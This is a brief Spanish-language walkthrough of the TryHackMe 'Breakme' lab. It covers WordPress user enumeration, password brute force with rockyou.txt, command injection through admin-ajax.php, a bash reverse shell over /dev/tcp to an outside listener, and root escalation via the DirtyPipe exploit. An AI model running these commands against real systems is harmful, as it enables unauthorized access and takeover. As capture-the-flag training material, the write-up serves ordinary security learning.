# Breakme - TryHackMe 
**IP:** 10.10.124.81

##  Enumeración Web
```bash
wpscan --url http://10.10.124.81/wordpress --enumerate u
  ```
Fuerza bruta con rockyou.txt:

```bash
wpscan --url http://10.10.124.81/wordpress -U admin -P /usr/share/wordlists/rockyou.txt
  ```

## Explotación de WordPress
Inyección de comandos:

```bash
curl "http://10.10.124.81/wordpress/wp-admin/admin-ajax.php?action=test&cmd=id"
  ```

Reverse Shell:


```bash
curl "http://10.10.124.81/wordpress/wp-admin/admin-ajax.php?action=test&cmd=bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
  ```

##  Escalada con DirtyPipe (CVE-2022-0847)

```bash
searchsploit dirtypipe
gcc exploit.c -o exploit
./exploit
  ```